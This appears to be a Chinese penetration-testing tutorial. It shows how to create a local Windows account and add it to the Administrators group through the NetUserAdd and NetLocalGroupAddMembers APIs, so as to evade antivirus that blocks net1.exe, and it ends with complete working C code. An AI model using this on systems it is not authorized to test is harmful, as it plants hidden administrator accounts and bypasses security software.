# 通过API添加Windows用户

## 简介

在渗透测试过程中，如果需要白利用远程桌面等服务，往往我们还需要一个知道密码的windows账户，而这个账户通常直接由net1.exe直接添加\(当然也可以直接pass the hash登录rdp，略略略\)，而调用这个可执行文件往往会被第三方杀软直接拦截（略略略，defender是微软自己的，不拦合法功能），这样我们就需要想另外的办法添加用户。

## 分析过程

1. 查文档&google\(狗头\)

![](../.gitbook/assets/image%20%28138%29.png)

1. 调用NetUserAdd添加本地用户
2. 调用NetLocalGroupAddMembers将用户添加到组

## 代码

微软文档解释了这个如何通过这个函数来添加操作系统账户，第一个参数servername指定了需要添加用户的主机名，传入NULL则为本地添加，第二个参数决定了第三个参数传入的结构体，通过这个函数我们可以在windows操作系统上添加账户。

```text
NET_API_STATUS NET_API_FUNCTION NetUserAdd(
  LPCWSTR servername,
  DWORD   level,
  LPBYTE  buf,
  LPDWORD parm_err
);
```

<table>
  <thead>
    <tr>
      <th style="text-align:left">Value</th>
      <th style="text-align:left">Meaning</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left"><b>1</b>
      </td>
      <td style="text-align:left">
        <p>Specifies information about the user account. The buf parameter points
          to a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_1">USER_INFO_1</a> structure.</p>
        <p>When you specify this level, the call initializes certain attributes to
          their default values. For more information, see the following Remarks section.</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left"><b>2</b>
      </td>
      <td style="text-align:left">Specifies level one information and additional attributes about the user
        account. The buf parameter points to a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_2">USER_INFO_2</a> structure.</td>
    </tr>
    <tr>
      <td style="text-align:left"><b>3</b>
      </td>
      <td style="text-align:left">Specifies level two information and additional attributes about the user
        account. This level is valid only on servers. The buf parameter points
        to a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_3">USER_INFO_3</a> structure.
        Note that it is recommended that you use <a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_4">USER_INFO_4</a> instead.</td>
    </tr>
    <tr>
      <td style="text-align:left"><b>4</b>
      </td>
      <td style="text-align:left">
        <p>Specifies level two information and additional attributes about the user
          account. This level is valid only on servers. The buf parameter points
          to a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-user_info_4">USER_INFO_4</a> structure.</p>
        <p><b>Windows 2000:  </b>This level is not supported.</p>
      </td>
    </tr>
  </tbody>
</table>

同理将该账户加入administrators组也是使用类似的函数，这里就不贴参数了。

```text
NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers(
  LPCWSTR servername,
  LPCWSTR groupname,
  DWORD   level,
  LPBYTE  buf,
  DWORD   totalentries
);
```

### 完整代码

```text
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <windows.h> 
#include <lm.h>

int wmain(int argc, wchar_t* argv[])
{
    USER_INFO_1 ui;
    DWORD dwLevel = 1;
    DWORD dwError = 0;
    NET_API_STATUS nStatus;

    if (argc != 3)
    {
        
        fwprintf(stderr, L"Usage:./this.exe <username> <password>\n", argv[0]);
        exit(1);
    }

    ui.usri1_name = argv[1];
    ui.usri1_password = argv[2];
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;

    nStatus = NetUserAdd(NULL,
        dwLevel,
        (LPBYTE)&ui,
        &dwError);

    if (nStatus == NERR_Success)
        fwprintf(stderr, L"User %s has been successfully added\n",argv[1]);

    else
        fprintf(stderr, "A system error has occurred: %d\n", nStatus);

    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = argv[1];

    NET_API_STATUS Status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);

    if (Status == NERR_Success || Status == ERROR_MEMBER_IN_ALIAS){
        printf("Administrators added Successfully!");
    }
    else {
        printf("Administrators added Failed!");
    }
    return 0;
}
```

## LINKS

{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers" %}

{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd" %}



